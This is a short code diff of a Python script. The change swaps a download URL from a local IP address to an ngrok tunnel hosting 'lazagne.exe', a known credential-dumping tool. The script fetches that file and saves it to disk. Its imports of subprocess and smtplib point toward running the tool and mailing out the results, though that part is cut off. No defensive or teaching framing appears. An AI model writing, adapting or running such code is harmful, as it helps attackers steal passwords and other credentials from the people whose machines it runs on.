@@ -1,9 +1,8 @@
 import requests
 import subprocess
 import smtplib
-import time
 def Download():
-    url = 'http://192.168.1.196/lazagne.exe'
+    url = 'https://6c13f021.ngrok.io/lazagne.exe'
     r = requests.get(url)
     file = url.split("/")[-1]
     with open(file,"wb") as out_file:
